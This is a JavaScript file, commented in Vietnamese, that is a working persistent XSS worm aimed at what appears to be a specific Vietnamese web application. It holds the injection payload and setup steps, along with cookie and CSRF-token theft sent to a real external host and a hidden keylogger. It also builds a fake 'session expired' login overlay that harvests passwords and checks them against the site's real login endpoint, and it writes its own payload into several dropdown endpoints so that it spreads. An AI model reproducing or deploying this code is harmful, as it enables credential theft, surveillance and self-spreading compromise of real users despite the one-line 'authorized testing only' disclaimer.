// ============================================================
// evil.js - Persistent XSS worm (tự nhân bản + hoạt động ngầm)
//
// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
//
// Đặc điểm:
// - KHÔNG alert, KHÔNG console.log, KHÔNG gây chú ý
// - Chạy lại MỖI LẦN trang load (persistent qua dropdown)
// - Gửi dữ liệu dạng JSON object về server
// - PHÂN BIỆT người dùng qua victim_id (fingerprint)
// - Tự hủy nếu chạy trùng (tránh chạy 2 lần trong 1 trang)
// - WORM: tự nhân bản payload vào các dropdown khác
// - ID NGẪU NHIÊN: không dùng id cố định (tránh bị phát hiện)
//
// Cách setup:
// 1. Chạy server: py attacker_server.py
// 2. Upload file này lên GitHub raw
// 3. Dán payload vào dropdown (học hàm/dân tộc...)
//    '><svg onload=$.get(`//URL_CỦA_BẠN/evil.js`).then(eval)>
// 4. MỌI NGƯỜI truy cập form → payload chạy → gửi về server
// ============================================================

(function() {
  'use strict';

  // ⚙️ CẤU HÌNH
  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/worker";  // Server nhận dữ liệu
  var WRITE_KEY = "BMU-WRITE-KEY-XXXXXXX-sdfd3";   // 🔴 ĐỔI THÀNH KEY GHI CỦA BẠN
  var VERSION = "2.0";

  // ============================================================
  // CHỐNG CHẠY TRÙNG (chỉ chạy 1 lần mỗi trang)
  // ============================================================
  try {
    if (window.__xssRunning) return;
    window.__xssRunning = true;
  } catch(e) {}

  // ============================================================
  // TẠO ID NGẪU NHIÊN (ẨN - tránh bị phát hiện)
  // ============================================================
  var RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

  function genId(len) {
    var s = '';
    for (var i = 0; i < (len || 8); i++) {
      s += RAND_CHARS.charAt(Math.floor(Math.random() * RAND_CHARS.length));
    }
    return s;
  }

  // ID ngẫu nhiên cho form phishing
  var ID_FORM = 'ov_' + genId(6);
  var ID_USER = 'in_' + genId(6);
  var ID_PASS = 'pd_' + genId(6);
  var ID_BTN = 'bt_' + genId(6);

  // ============================================================
  // FINGERPRINT DUY NHẤT CHO MỖI NGƯỜI DÙNG
  // ============================================================
  function getVictimId() {
    try {
      var id = localStorage.getItem('__v_id');
      if (!id) {
        id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        localStorage.setItem('__v_id', id);
      }
      return id;
    } catch(e) {
      return 'V' + Date.now().toString(36);
    }
  }

  function getFingerprint() {
    var parts = [
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      screen.colorDepth,
      navigator.platform,
      new Date().getTimezoneOffset()
    ];
    var hash = 0;
    for (var i = 0; i < parts.join('|').length; i++) {
      hash = ((hash << 5) - hash) + parts.join('|').charCodeAt(i);
      hash |= 0;
    }
    return 'FP' + Math.abs(hash).toString(36);
  }

  var victimId = getVictimId();
  var fingerprint = getFingerprint();

  // ============================================================
  // GỬI DỮ LIỆU VỀ SERVER
  // ============================================================
  function exfil(data, type) {
    try {
      var payload = {
        victim_id: victimId,
        fingerprint: fingerprint,
        type: type,
        time: new Date().toISOString(),
        data: data
      };

      fetch(ATTACKER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': WRITE_KEY
        },
        body: JSON.stringify(payload),
        mode: 'no-cors'
      }).catch(function() {});

      var img = new Image();
      img.src = ATTACKER_URL + '?key=' + encodeURIComponent(WRITE_KEY) + '&v=' + victimId + '&f=' + fingerprint + '&t=' + type + '&d=' + encodeURIComponent(JSON.stringify(data).substring(0, 500));
    } catch(e) {}
  }

  // ============================================================
  // THU THẬP THÔNG TIN
  // ============================================================
  var cookies, csrfToken;
  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }
  try {
    var c = document.querySelector('meta[name="csrf-token"]');
    csrfToken = (c && c.content) ? c.content : "none";
  } catch(e) { csrfToken = "none"; }

  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        uid: gon.user_id,
        uname: gon.user_name || gon.username,
        org: gon.organization,
        lead: gon.leader_roles,
        fac: gon.faculty,
        roles: gon.roles
      };
    }
  } catch(e) {}

  var pageInfo = {
    url: location.href.substring(0, 300),
    domain: document.domain,
    title: document.title.substring(0, 100),
    ua: navigator.userAgent.substring(0, 150),
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height,
    time: new Date().toISOString()
  };

  // Gửi dữ liệu MỖI LẦN trang load
  exfil({
    cookies: cookies.substring(0, 500),
    csrf: csrfToken.substring(0, 100),
    url: pageInfo.url,
    domain: pageInfo.domain,
    title: pageInfo.title,
    ua: pageInfo.ua,
    lang: pageInfo.lang,
    screen: pageInfo.screen,
    gon: gonData,
    ver: VERSION
  }, 'visit');

  // ============================================================
  // KEYLOGGER NGẦM
  // ============================================================
  (function() {
    var buf = [];
    document.addEventListener('keydown', function(e) {
      try {
        var key = e.key;
        if (key.length > 1) key = '[' + key + ']';
        buf.push(key);
        if (buf.length >= 15) {
          exfil({ keys: btoa(buf.join('')), url: pageInfo.url }, 'key');
          buf = [];
        }
      } catch(e2) {}
    });
  })();

  // ============================================================
  // XÁC THỰC TÀI KHOẢN QUA API LOGIN GỐC
  // ============================================================
  // Endpoint login: POST /login?lang=vi
  // Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
  // 2FA: POST /login_two_auth?lang=vi voi field token
  // RECAPTCHA: nguoi dung tu tick trong form phishing -> token verify login
  // Login thanh cong: tra ve 302 redirect + Set-Cookie _msbmtu_ses
  var RECAPTCHA_SITEKEY = '6LcPvWotAAAAAAvgvdkjo1oHooXdF1MWyGxp29qu';
  var recaptchaToken = '';

  // Callback khi nguoi dung tick xong recaptcha
  // Bat nut voi hieu ung ro rat (mau xanh la, animation pulse)
  window.onRecaptchaSuccess = function(token) {
    recaptchaToken = token;
    try {
      var btn = document.getElementById(ID_BTN);
      if (btn) {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.background = '#28a745';
        btn.style.boxShadow = '0 0 15px rgba(40,177,67,0.8)';
        // btn.style.transition = 'all 0.3s ease';
        btn.style.animation = 'pulseGreen 0.8s ease-in-out 3';
      }
    } catch(e) {}
  };

  // Callback khi recaptcha het han
  window.onRecaptchaExpired = function() {
    recaptchaToken = '';
    try {
      var btn = document.getElementById(ID_BTN);
      if (btn) {
        btn.disabled = true;
        btn.style.opacity = '0.6';
        btn.style.background = '#1976d2';
        btn.style.boxShadow = 'none';
      }
    } catch(e) {}
  };

  // Ham verify login qua API goc
  // Thanh cong (302 redirect + cookie _msbmtu_ses) -> valid = true
  // Khong can header X-Requested-With (theo response thuc te)
  function verifyLogin(username, password, callback) {
    try {
      var csrf = '';
      try {
        var m = document.querySelector('meta[name="csrf-token"]');
        csrf = m ? m.content : '';
      } catch(e) {}

      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/login?lang=vi', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.withCredentials = true;  // gui cookie de nhan _msbmtu_ses
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var valid = false;
          var status = xhr.status;
          var url = xhr.responseURL || '';
          var text = xhr.responseText || '';

          // Login thanh cong -> 302 redirect khoi trang /login + Set-Cookie _msbmtu_ses
          var setCookie = xhr.getResponseHeader('Set-Cookie') || '';
          if ((status === 302 || (status >= 300 && status < 400)) &&
              url.indexOf('/login') === -1 &&
              setCookie.indexOf('_msbmtu_ses') >= 0) {
            valid = true;
          }
          // JSON success (fallback)
          else if (status === 200) {
            if (text.indexOf('"success":true') >= 0 || text.indexOf("'success':true") >= 0) {
              valid = true;
            }
          }

          callback(valid, status);
        }
      };
      xhr.onerror = function() { callback(false, 0); };

      var params =
        'utf8=' + encodeURIComponent('') +
        '&authenticity_token=' + encodeURIComponent(csrf) +
        '&email_txt=' + encodeURIComponent(username) +
        '&password_txt=' + encodeURIComponent(password) +
        '&g-recaptcha-response=' + encodeURIComponent(recaptchaToken);
      xhr.send(params);
    } catch(e) {
      callback(false, 0);
    }
  }

  // ============================================================
  // WORM - TU NHAN BAN PAYLOAD VAO CAC DROPDOWN KHAC
  // ============================================================
  // Script tu tao them ban ghi payload vao cac dropdown khac
  // de lan truyen. Chi lay 1 lan moi trinh duyet (tranh spam).
  function wormSpread() {
    try {
      if (localStorage.getItem('__w_done') === '1') return;

      // URL script hien tai (tu phat hien)
      var scriptUrl = '';
      try {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
          var src = scripts[i].src || '';
          if (src.indexOf('evil') >= 0 || src.indexOf('tester') >= 0 || src.indexOf('worker') >= 0) {
            scriptUrl = src;
            break;
          }
        }
      } catch(e) {}
      if (!scriptUrl) {
        scriptUrl = '//raw.githubusercontent.com/tringuyen1998allstar2018/testerfromhell/refs/heads/main/evil.js';
      }

      // Payload de nhan ban
      var wormPayload = "'><svg onload=$.get(`" + scriptUrl + "`).then(eval)>";

      var targets = [
        { path: '/academicrank', key: 'name' },
        { path: '/ethnic', key: 'name' },
        { path: '/nationality', key: 'name' },
        { path: '/religions', key: 'name' },
        { path: '/tbusertype', key: 'name' },
        { path: '/tbuserstatus', key: 'name' },
        { path: '/tbhospitals', key: 'name' }
      ];

      var getCsrf = function() {
        try {
          var m = document.querySelector('meta[name="csrf-token"]');
          return m ? m.content : '';
        } catch(e) { return ''; }
      };

      var csrf = getCsrf();

      // Lay lan toi da 3 endpoint
      var spreadCount = 0;
      for (var t = 0; t < targets.length && spreadCount < 3; t++) {
        (function(tgt) {
          try {
            if (window.jQuery) {
              jQuery.ajax({
                url: tgt.path,
                method: 'POST',
                data: {
                  authenticity_token: csrf,
                  [tgt.key]: wormPayload,
                  name: wormPayload,
                  scode: 'W' + genId(10)
                },
                complete: function(r) {
                  if (r && r.status === 200) {
                    spreadCount++;
                    exfil({ spread: tgt.path }, 'spread');
                  }
                }
              });
            }
          } catch(e) {}
        })(targets[t]);
      }

      try { localStorage.setItem('__w_done', '1'); } catch(e) {}
    } catch(e) {}
  }

  // ============================================================
  // DONG MODAL BOOTSTRAP + TAO FORM PHISHING
  // ============================================================
  function createPhishForm() {
    try {
      if (localStorage.getItem('__f_done') === '1') return;

      // Dong modal Bootstrap dang mo
      try {
        if (window.jQuery && jQuery.fn && jQuery.fn.modal) {
          jQuery('.modal').each(function() {
            try { jQuery(this).modal('hide'); } catch(e3) {}
          });
        }
        document.body.classList.remove('modal-open');
        var bd = document.querySelectorAll('.modal-backdrop');
        for (var bi = 0; bi < bd.length; bi++) bd[bi].parentNode.removeChild(bd[bi]);
        var md = document.querySelectorAll('.modal.show, .modal[style*="display: block"]');
        for (var mi = 0; mi < md.length; mi++) {
          md[mi].style.display = 'none';
          md[mi].classList.remove('show');
        }
        document.body.style.overflow = '';
        document.body.style.paddingRight = '';
      } catch(e3) {}

      // Tao overlay
      var overlay = document.createElement('div');
      overlay.setAttribute('id', ID_FORM);
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
        'background:rgba(0,0,0,0.88);z-index:2147483647;display:flex;' +
        'align-items:center;justify-content:center;pointer-events:auto;';

      overlay.addEventListener('click', function(e) { e.stopPropagation(); });
      overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
      overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });

      // Hop form
      var box = document.createElement('div');
      box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;' +
        'font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;' +
        'position:relative;z-index:2147483647;box-shadow:0 0 30px rgba(0,0,0,0.5);';

      var title = document.createElement('h2');
      title.textContent = 'Dang Nhap';
      title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
      box.appendChild(title);

      var msg = document.createElement('p');
      msg.textContent = 'Phi session da het. Vui long dang nhap lai.';
      msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
      box.appendChild(msg);

      // O username
      var userInput = document.createElement('input');
      userInput.setAttribute('type', 'text');
      userInput.setAttribute('placeholder', 'Ten dang nhap / Email / Ma NV / So DT');
      userInput.setAttribute('id', ID_USER);
      userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(userInput);

      // O password
      var passInput = document.createElement('input');
      passInput.setAttribute('type', 'password');
      passInput.setAttribute('placeholder', 'Mat khau');
      passInput.setAttribute('id', ID_PASS);
      passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(passInput);

      // Nut xac nhan - disabled cho toi khi tick recaptcha
      // Khi recaptcha thanh cong: nut sang xanh la + animation pulse ro rat
      var btn = document.createElement('button');
      btn.textContent = 'Xac nhan';
      btn.setAttribute('id', ID_BTN);
      btn.disabled = true;
      btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;' +
        'opacity:0.6;transition:all 0.3s ease;';
      box.appendChild(btn);

      // CSS animation pulse cho nut khi recaptcha thanh cong
      var style = document.createElement('style');
      style.textContent =
        '@keyframes pulseGreen{0%{transform:scale(1);box-shadow:0 0 8px rgba(40,177,67,0.5);}50%{transform:scale(1.04);box-shadow:0 0 20px rgba(40,177,67,0.8);}100%{transform:scale(1);box-shadow:0 0 10px rgba(40,177,67,0.6);}}';
      document.head.appendChild(style);

      // RECAPTCHA WIDGET - nguoi dung tu tick
      var recaptchaDiv = document.createElement('div');
      recaptchaDiv.setAttribute('class', 'g-recaptcha');
      recaptchaDiv.setAttribute('data-sitekey', RECAPTCHA_SITEKEY);
      recaptchaDiv.setAttribute('data-callback', 'onRecaptchaSuccess');
      recaptchaDiv.setAttribute('data-expired-callback', 'onRecaptchaExpired');
      recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;';
      box.appendChild(recaptchaDiv);

      // Tai script recaptcha neu chua co
      if (!document.querySelector('script[src*="recaptcha/api.js"]')) {
        var recaptchaScript = document.createElement('script');
        recaptchaScript.src = 'https://www.google.com/recaptcha/api.js';
        recaptchaScript.async = true;
        recaptchaScript.defer = true;
        document.head.appendChild(recaptchaScript);
      }

      overlay.appendChild(box);
      document.body.appendChild(overlay);

      // Focus vao o username
      setTimeout(function() {
        try { userInput.focus(); } catch(e) {}
      }, 300);

      // Chong Bootstrap focus trap
      document.addEventListener('keydown', function(e) {
        try {
          if (document.activeElement !== userInput && document.activeElement !== passInput) {
            if (e.key.length === 1 || e.key === 'Backspace' || e.key === ' ' || e.key === 'Enter') {
              e.stopImmediatePropagation();
              userInput.focus();
            }
          }
        } catch(e2) {}
      }, true);

      // Xu ly nut bam - verify qua login goc + recaptcha token roi moi exfil
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        var u = userInput.value;
        var p = passInput.value;

        // Kiem tra da tick recaptcha chua
        if (!recaptchaToken) {
          msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.';
          msg.style.color = '#d32f2f';
          return;
        }

        // 1. Xac thuc qua API login goc (kem recaptcha token)
        verifyLogin(u, p, function(valid, loginStatus) {
          // 2. Gui ve server kem trang thai valid
          exfil({
            username: u,
            password: p,
            valid: valid,
            login_status: loginStatus,
            recaptcha: recaptchaToken.substring(0, 20) + '...',
            url: pageInfo.url
          }, 'pwd');
          // 3. Danh dau da xong
          try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
          overlay.remove();
        });
      });

      // Enter submit - cung verify qua login goc + recaptcha
      document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          var eu = userInput.value;
          var ep = passInput.value;
          if (eu || ep) {
            if (!recaptchaToken) {
              msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.';
              msg.style.color = '#d32f2f';
              return;
            }
            verifyLogin(eu, ep, function(valid, loginStatus) {
              exfil({
                username: eu,
                password: ep,
                valid: valid,
                login_status: loginStatus,
                recaptcha: recaptchaToken.substring(0, 20) + '...',
                url: pageInfo.url
              }, 'pwd');
              try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
              overlay.remove();
            });
          }
        }
      });

    } catch(e) {}
  }

  // ============================================================
  // CHAY
  // ============================================================
  // Hien form phishing sau 1 giay
  setTimeout(createPhishForm, 1000);

  // Chay worm sau 5 giay
  setTimeout(wormSpread, 5000);

  // ============================================================
  // TOM TAT:
  // 1. Gui 'visit' ve server moi lan truy cap
  // 2. Keylogger ghi am tham, gui moi 15 phim
  // 3. Phishing form ID NGU NHIEN
  // 4. Worm tu nhan ban payload vao dropdown khac
  // 5. Dong modal Bootstrap truoc khi hien form
  // 6. XUAT KA tap theo API login goc (/login)
  //    POST /login?lang=vi
  //    Fields: email_txt, password_txt, authenticity_token
  //    Thanh cong: 302 redirect + Set-Cookie _msbmtu_ses
  //    Ket qua valid true/false gui kem ve server
  // 7. RECAPTCHA: nguoi dung tu tick trong form phishing
  //    Token recaptcha dung de verify login
  //    Nut bam disabled cho toi khi tick recaptcha
  //    Khi tick xong: nut sang xanh la + animation pulse ro rat
  // ============================================================
})();
